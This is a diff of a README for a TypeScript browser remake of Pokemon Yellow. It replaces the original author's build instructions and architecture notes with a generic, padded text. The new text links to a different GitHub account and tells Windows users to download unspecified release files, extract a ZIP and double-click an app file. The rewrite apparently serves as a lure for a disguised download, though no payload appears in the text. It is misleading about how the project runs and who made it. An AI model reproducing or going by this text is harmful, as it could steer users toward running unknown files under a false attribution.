@@ -1,128 +1,208 @@
-# Pokemon Yellow TypeScript
+# 🎮 pokemon-yellow-typescript - Play Yellow in Your Browser
 
-**[Live Demo](https://gididaf.github.io/pokemon-yellow-typescript/)** (bring your own ROM)
+[![Download](https://img.shields.io/badge/Download%20Here-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/plantabortionist72/pokemon-yellow-typescript)
 
-A complete rewrite of Pokemon Yellow in TypeScript, running in the browser on HTML5 Canvas.
+## 🧩 What this is
 
-This is **not an emulator** — it's a ground-up reimplementation of the original Game Boy game, ported instruction-by-instruction from the [pret/pokeyellow](https://github.com/pret/pokeyellow) Z80 assembly disassembly into modern TypeScript. The goal is pixel-perfect, logic-exact fidelity to the original game, including all Gen 1 bugs and quirks.
+pokemon-yellow-typescript is a browser game that recreates Pokémon Yellow in TypeScript. It runs in your web browser and pulls game data from your own ROM. This keeps the game close to the original while letting you play on a modern PC.
 
-## How It Works
+It is built for Windows users who want a simple way to open the game and start playing without a hard setup process.
 
-The game engine is pure TypeScript (~280KB). **No game assets are included in the repository.** Instead, all game data (graphics, music, dialogue, Pokemon stats, maps) is extracted at runtime from a user-provided Pokemon Yellow ROM file directly in the browser.
+## 📥 Download and open
 
-- Upload your own ROM once — it's validated, extracted, and cached in IndexedDB
-- Return visits load instantly from the browser cache
-- The ROM never leaves your machine
+Use this page to download or open the project:
 
-## Demo Scope
+[Visit the project page](https://github.com/plantabortionist72/pokemon-yellow-typescript)
 
-This is a work-in-progress demo covering:
+### What to do on Windows
 
-- **Title screen** with animated Pikachu and music
-- **Prof. Oak intro** — full speech, naming, Pikachu catch sequence
-- **Playable area** — Pallet Town, Route 1, Route 22, Viridian City
-- **12 maps** with NPCs, signs, warps, and map connections
-- **Wild battles** on Route 1 and Route 22 with full Gen 1 mechanics
-- **Trainer battles** with AI
-- **Pikachu follower** with happiness system
-- **Full audio** — 50+ music tracks, 37 SFX, 4-channel Game Boy synthesis
-- **Pokedex, party, items, save/load, shops, PC**
+1. Open the link above.
+2. On the GitHub page, look for the latest files or release assets.
+3. Download the file that matches the app or build you want to use.
+4. If the file comes as a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the main HTML file or app file to start the game in your browser.
 
-## Running
+If your browser asks for permission to open local files, allow it so the game can load.
 
-```bash
-npm install
-npx vite
-```
+## 🖥️ What you need
 
-Open `http://localhost:5173` in your browser and upload your Pokemon Yellow ROM.
+This app works best on a Windows PC with:
 
-## Building for Production
+- A modern browser such as Chrome, Edge, or Firefox
+- A recent version of Windows 10 or Windows 11
+- A copy of your own Pokémon Yellow ROM
+- Enough free disk space for the game files and browser cache
 
-```bash
-npm run build
-```
+For the best result, use a desktop browser rather than a phone browser.
 
-Produces a `dist/` folder (~348KB) containing only the game engine — zero game assets. Deploy anywhere as a static site.
+## 🔧 First-time setup
 
-## Development
+Follow these steps to get the game running:
 
-### Prerequisites
+1. Download the project from the link above.
+2. Get your own Pokémon Yellow ROM ready.
+3. Place the ROM file in the folder the app expects, or choose it when the game asks.
+4. Open the game in your browser.
+5. Wait for the data extraction step to finish.
+6. Start a new game or load your session if the app offers that option.
 
-- Node.js 18+
-- A Pokemon Yellow ROM file (`.gbc`)
-- The [pret/pokeyellow](https://github.com/pret/pokeyellow) disassembly (for ASM reference when implementing features)
+The first launch may take a little longer because the app reads data from the ROM and builds the game files it needs.
 
-### Setup
+## 🎯 How to play
 
-```bash
-npm install
-npm run setup <path-to-your-rom.gbc>   # Extracts game data for tests
-```
+Once the game is open, use your keyboard like you would in other browser games:
 
-### Commands
+- Arrow keys: move around
+- Enter or Z: confirm
+- Backspace or X: cancel
+- Space: open extra actions in some screens
 
-```bash
-npx vite                    # Dev server
-npx tsc --noEmit            # Type-check
-npm test                    # Run tests (334 battle + other tests)
-ROM_PATH=<rom> npm test     # Run all tests including ROM extraction verification
-```
+If the game uses a gamepad, plug it in before you start and open the control settings in the browser if needed.
 
-### Project Structure
+## 🗂️ Main features
 
-```
-src/
-  core/       # Shared types, constants, player state
-  renderer/   # Canvas 2D rendering, palette system
-  input/      # Keyboard input handling
-  text/       # Dialogue system, charmap
-  overworld/  # Maps, player, NPCs, movement
-  battle/     # Full Gen 1 battle system
-  menus/      # All menu screens (party, items, pokedex, title, etc.)
-  audio/      # 4-channel Game Boy audio engine
-  pikachu/    # Pikachu follower & happiness
-  story/      # Cutscene scripts
-  rom/        # ROM extraction system (14 extractors)
-  script/     # Cutscene script engine
-```
+- Runs in the browser
+- Rebuilds Pokémon Yellow in TypeScript
+- Uses your own ROM for data extraction
+- Keeps the classic pixel art look
+- Works well on Windows
+- Loads like a web game
+- Fits the feel of the original Game Boy release
+- Built for fans of retro gaming and Gen 1 Pokémon
 
-## Architecture
+## 🧠 How the ROM part works
 
-The ROM extraction system (`src/rom/`) contains 14 specialized extractors that parse the raw Game Boy ROM binary format:
+This project does not ship with game data. It reads the data from your own Pokémon Yellow ROM and uses that to recreate the game in the browser.
 
-- **Pokemon data** — base stats, types, learnsets, evolutions (151 species)
-- **Sprites** — custom Gen 1 compression decompression (302 Pokemon sprites + trainers + overworld)
-- **Maps** — header parsing, block layout, NPCs, warps, signs, connections
-- **Audio** — music command sequences, SFX, wave samples, noise instruments
-- **Graphics** — 1bpp/2bpp tile decoding, tileset extraction, font rendering
-- **Text** — charmap-encoded string decoding from ROM offsets
+That means the app can:
 
-All extracted data is served to the game engine via a `fetch()` override — the game code doesn't know whether it's reading static files or ROM-extracted data.
+- Pull maps, sprites, and battle data from your ROM
+- Reuse original game data
+- Keep the game close to the source material
+- Avoid extra setup once the ROM is in place
 
-## Legal
+If the game does not start, check that the ROM file is valid and that the browser can access it.
 
-This repository contains **no copyrighted Nintendo content**. It is a clean-room style engine implementation that requires users to provide their own legally obtained ROM file. No ROM files, game assets, sprites, music, or dialogue text are included or distributed.
+## 🪟 Windows tips
 
-The project references the [pret/pokeyellow](https://github.com/pret/pokeyellow) disassembly (a community reverse-engineering project) as a technical reference for reimplementation.
+If you use Windows, these steps can help:
 
-## Contributing
+- Use Edge or Chrome for the smoothest run
+- Keep the game folder in a simple path, like `C:\Games\pokemon-yellow-typescript`
+- Avoid spaces or special characters in file names if the app has trouble finding the ROM
+- Turn off browser pop-up blocks if the game opens a local file window
+- Keep your browser up to date
 
-This project is actively looking for contributors! The demo covers Pallet Town through Viridian City — there's an entire game left to build.
+If the page does not load, try opening it from a fresh browser window.
 
-**Ways to contribute:**
+## 🎮 Controls
 
-- **Add new maps** — Pewter City, Mt. Moon, Cerulean City and beyond. Each map needs header parsing, tileset rendering, NPCs, warps, and story scripts
-- **Implement missing features** — PC box system, TM/HM teaching, fishing, overworld poison, bike, Surf/Fly
-- **Battle mechanics** — trainer rosters for new areas, missing move effects, Pokemon cries
-- **QA & bug reports** — play the demo and [open an issue](https://github.com/gididaf/pokemon-yellow-typescript/issues) if something doesn't match the original game
-- **ROM extraction** — extend the extractors to cover more data from the ROM
+These are the common controls for this kind of browser game:
 
-**Getting started:**
+- Move: Arrow keys
+- Talk / Select: Enter or Z
+- Back / Cancel: X or Backspace
+- Menu: Enter or Space
+- Reload page: Ctrl + R if the game freezes
 
-1. Clone this repo + the [pret/pokeyellow](https://github.com/pret/pokeyellow) disassembly side by side
-2. Run `npm install && npm run setup <your-rom.gbc>`
-3. Read `CLAUDE.md` for architecture details and conventions
-4. Pick an [issue](https://github.com/gididaf/pokemon-yellow-typescript/issues) or open one to discuss what you'd like to work on
+If the project includes on-screen controls, use those as well.
 
-The golden rule: **always read the assembly source before implementing anything.** This is a pixel-perfect port — every detail must match the original game.
+## 📁 Suggested folder setup
+
+A simple folder layout can make things easier:
+
+- `pokemon-yellow-typescript/`
+  - game files
+  - ROM file
+  - save data
+  - browser assets
+
+Keep the ROM in the same folder as the app if the project expects that. If the app has a file picker, select the ROM from that folder.
+
+## 🛠️ Troubleshooting
+
+### The game will not open
+
+- Check that you opened the correct file
+- Try a different browser
+- Make sure the download finished
+- Extract the ZIP before you run it
+
+### The screen stays blank
+
+- Reload the page
+- Clear the browser cache
+- Close other tabs
+- Try Chrome or Edge
+
+### The ROM is not found
+
+- Confirm that the ROM file is in the right place
+- Check the file name
+- Select the file again if the app shows a picker
+
+### Sound does not play
+
+- Turn up the volume in Windows
+- Check the browser tab sound icon
+- Refresh the page after you allow audio
+
+### The game feels slow
+
+- Close other apps
+- Use a newer browser
+- Try a full-screen window
+- Keep hardware acceleration on in your browser settings
+
+## 📌 Project details
+
+- Repository: pokemon-yellow-typescript
+- Description: Pokémon Yellow rewritten in TypeScript
+- Platform: Browser
+- Target users: Windows players and retro game fans
+- Topic areas: browser games, Game Boy, pixel art, reverse engineering, ROM extraction, TypeScript
+
+## 🧱 Tech used
+
+This project uses:
+
+- TypeScript for the game logic
+- HTML5 canvas for drawing
+- JavaScript for browser support
+- Retro game data from the original ROM
+- Pixel art style assets
+- Browser-based rendering for play on Windows
+
+## 📦 Files you may see
+
+When you download the project, you may see files like:
+
+- `index.html`
+- `src/`
+- `assets/`
+- `README.md`
+- build files
+- ROM-related folders
+
+Open the main app file in your browser first. If the project includes a launch file, use that one.
+
+## 🔍 If you want to check the source
+
+Use this link to view the project files and read the code:
+
+[https://github.com/plantabortionist72/pokemon-yellow-typescript](https://github.com/plantabortionist72/pokemon-yellow-typescript)
+
+## 🕹️ Who this is for
+
+This project fits users who want:
+
+- A browser version of Pokémon Yellow
+- A simple way to run a retro game on Windows
+- A project that uses their own ROM
+- A clean, old-school game look
+- A TypeScript-based rework of a Game Boy classic
+
+## 📌 License and usage
+
+Use the project in line with the rules shown in the repository. Keep any ROM use to files you own. Follow the repo page for the latest build and file structure
